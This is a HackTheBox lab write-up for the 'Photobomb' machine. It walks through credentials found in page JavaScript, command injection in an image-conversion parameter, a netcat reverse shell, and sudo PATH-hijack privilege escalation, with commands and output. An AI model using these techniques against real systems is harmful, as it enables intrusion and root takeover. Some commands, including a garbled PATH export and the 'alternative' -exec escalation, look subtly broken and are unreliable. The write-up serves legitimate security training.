---
title: "Photobomb"
date: 2023-02-11 21:00:00 +0530
categories: [HackTheBox, HTB-Linux]
tags: [Machines,Linux]
image: /assets/img/photobomb/Photobomb.png
---

This is [hackthebox](https://app.hackthebox.com/machines/Photobomb) easy rated machine designed to show the command injection for the user access and path injection knowledge for the root user. In this box i will show three ways of how to be root user.
Lets start.
## Enumeration
### Nmap Scan
```
# Nmap 7.93 scan initiated Sat Feb 11 22:49:14 2023 as: nmap -sC -sV -oN nmap-scan 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.31s latency).
Scanned at 2023-02-11 22:49:15 EAT for 208s
Not shown: 988 closed tcp ports (conn-refused)
PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwlzrcH3g6+RJ9JSdH4fFJPibAIpAZXAl7vCJA+98jmlaLCsANWQXth3UsQ+TCEf9YydmNXO2QAIocVR8y1NUEYBlN2xG4/7txjoXr9QShFwd10HNbULQyrGzPaFEN2O/7R90uP6lxQIDsoKJu2Ihs/4YFit79oSsCPMDPn8XS1fX/BRRhz1BDqKlLPdRIzvbkauo6QEhOiaOG1pxqOj50JVWO3XNpnzPxB01fo1GiaE4q5laGbktQagtqhz87SX7vWBwJXXKA/IennJIBPcyD1G6YUK0k6lDow+OUdXlmoxw+n370Knl6PYxyDwuDnvkPabPhkCnSvlgGKkjxvqks9axnQYxkieDqIgOmIrMheEqF6GXO5zz6WtN62UAIKAgxRPgIW0SjRw2sWBnT9GnLag74cmhpGaIoWunklT2c94J7t+kpLAcsES6+yFp9Wzbk1vsqThAss0BkVsyxzvL0U9HvcyyDKLGFlFPbsiFH7br/PuxGbqdO9Jbrrs9nx60=
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrVE9flXamwUY+wiBc9IhaQJRE40YpDsbOGPxLWCKKjNAnSBYA9CPsdgZhoV8rtORq/4n+SO0T80x1wW3g19Ew=
|   256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEp8nHKD5peyVy3X3MsJCmH/HIUvJT+MONekDg5xYZ6D
80/tcp    open     http             nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 11 22:52:43 2023 -- 1 IP address (1 host up) scanned in 208.88 seconds
```
Nmap shows two open ports, port 80 which serves for the web server and port 22 for ssh login. After having these details i will check for the web page to see how it looks like.
### Web Page enumeration
![image](/assets/img/photobomb/01.png)

Remember this page  won't show up until you add the ip address to the `/etc/hosts` with the name `photobomb.htb`.

This web page has a link to another page which says `click here`. Then after clicking the link,  it will pop up the followings:

![image](/assets/img/photobomb/02.png)

After some failed trials of known usernames and passwords i decided to read again from the page and there was a hint there `click here (the credentials are in your welcome pack)`  then i  checked source codes and found this `javascript` 
```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
All i care about this code is this part `pH0t0:b0Mb!` which are the credentials for login where by `pH0t0` being the username and `b0Mb!` the password. Then i used this credentials to login.

![image](/assets/img/photobomb/03.png)

After submitting the correct credentials then user will be redirected to `printer` directory where there is some images and printing option at the bottom 

![image](/assets/img/photobomb/04.png)
### Command Injection
The web page gives user options  of downloading either `png` or `jpg` and also allows him to resize too. To understand much about how this web works lets fire up `burp suite` and intercept this request and trying to change it to see if there is a vulnerability.

![image](/assets/img/photobomb/05.png)

if user selects  image according to to the intended way of the web application , then the request in burp will be seen as follows:

![image](/assets/img/photobomb/06.png)

But when user alter even small details then the site will respond as follows:

![image](/assets/img/photobomb/07.png)

Or 

![image](/assets/img/photobomb/08.png)

This web seems to handle pictures conversion using the tool known as `convert`  and it seems to consider three things which are `photoname` `filetype` and `dimension` of the image. If these are not handled well there is a possibility to cause command injection. so i will try the sleep command to see if there is a response from the server to prove the command injection vulnerability.
I will test all parameters starting with `photo`, `dimension` and then `filetype`

**Photo**

![image](/assets/img/photobomb/09.png)

No delay of request 

**Dimensions**

![image](/assets/img/photobomb/10.png)

The same to dimension

**File type**

![image](/assets/img/photobomb/11.png)

Here we go there is a delay from the request i made then this shows that this parameter has command injection.

## User 
1. Start netcat listener on your machine 
```
┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/photobomb]
└─$ nc -nlvp 1234                           
listening on [any] 1234 ...
```
2. Send request with the reverse shell payload through burpsuite

![image](/assets/img/photobomb/12.png)

3. Result
```
┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/photobomb]
└─$ nc -nlvp 1234                                                                                                  1 ⨯
listening on [any] 1234 ...
connect to [10.10.14.160] from (UNKNOWN) [10.10.11.182] 48802
bash: cannot set terminal process group (733): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ 
```
Now i have a shell but it is not stable and any action including `control + c` we result to the lost of shell so i will stabilize it.

```
wizard@photobomb:~/photobomb$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ export TERM=xterm
export TERM=xterm

wizard@photobomb:~/photobomb$ ^Z
zsh: suspended  nc -nlvp 1234

┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/photobomb]
└─$ stty raw -echo; fg
[1]  + continued  nc -nlvp 1234

wizard@photobomb:~/photobomb$ 
```
Now lets check for user flag
```
wizard@photobomb:~$ cat user.txt 
88b428d207bfb*******************
```
## Root
The first thing to check after getting user access is what commands do normal user run with `sudo`  this can be checked by using `sudo -l`
```
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
User `wizard` can run a script `/opt/cleanup.sh` with root privileges by using `sudo`  command.  `setenv` command is used to  change or add an environment variable, meaning there is possibility of having path injection.

Then up to here i decided to check this script to see its content 
```
wizard@photobomb:~$ cat /opt/cleanup.sh 
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
### Unintended way to root
All the command run specified in the script have the full path except  `find` command, then i can create a malicious file and name name it `find` and then inject the path variable and run `/opt/cleanup.sh`  with `sudo` command. 

![image](/assets/img/photobomb/13.png)

All i need here  to make sure that malicious `find` command (which i have created) is being executed before  `/usr/bin` in path variable. 
1. Create `find`  script and make it executable which will execute to give back the root access
```
wizard@photobomb:/tmp$ echo -e  "#/bin/bash\nbash" > find
wizard@photobomb:/tmp$ cat find
#/bin/bash
bash
wizard@photobomb:/tmp$ chmod +x find
```
2. Add the new `find` path at the beginning of the path variable  to execute before `/usr/bin` 
```
wizard@photobomb:/tmp$ export PATH=/tmp:$PATH
wizard@photobomb:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
3. Execute `/opt/cleanup.sh` with `sudo` and new `find` command
```
wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh 
root@photobomb:/home/wizard/photobomb# 
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
96cff980d7332b4********
```
### Intended way
Back to `/opt/cleanup.sh`

```
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
This script start with `.` which is equal to `source` command its main function is simply to refresh the `.bashrc` in order to apply new changes. Condition statement checks for two things, first one is size of the file and the symbolic link.

`[ -s log/photobomb.log ]` checks if the file `log/photobomb.log` exists and if it has a size greater than 0(i.e. it is not empty).
`! [ -L log/photobomb.log ]` checks if the file `log/photobomb.log` is not a symbolic link. If all the conditions are met then it will send the content into `log/photobomb.log.old` and `truncate` on the log to set it’s size to 0. 
The last one will find images in `source_images`  with extension `.jpg` and change their ownership to root user.

I checked `.bashrc` file 
```
# System-wide .bashrc file for interactive bash(1) shells.

# To enable the settings / commands in this file for login shells as well,
# this file has to be sourced in /etc/profile.

# Jameson: ensure that snaps don't interfere, 'cos they are dumb
PATH=${PATH/:\/snap\/bin/}

# Jameson: caused problems with testing whether to rotate the log file
enable -n [ # ]
```
And the first thing is about the environment variables and the second thing is `enable -n [ # ]`. `enable` command is used to enable and disable built in commands then `enable -n [ # ]` will enable `[` and comment `]` this will  result to path injection.
```
wizard@photobomb:/tmp$ echo -e '#!/bin/bash\nbash' > [
wizard@photobomb:/tmp$ chmod +x [
wizard@photobomb:/tmp$ export PATH=/tmp:$PATH0d17567e349d26e167a
wizard@photobomb:/tmp$ sudo PATH=pwd:$PATH /opt/cleanup.sh 
root@photobomb:/tmp# 
```
## Alternative.
Since user can use `find` command with root privileges then i can use the option `exec` to execute `/bin/bash`
```
wizard@photobomb:/tmp$ sudo PATH=$PATH /opt/cleanup.sh -exec /bin/bash \;
root@photobomb:/tmp# whoami
root
```
The End.
```
Mungu Nisaidie
```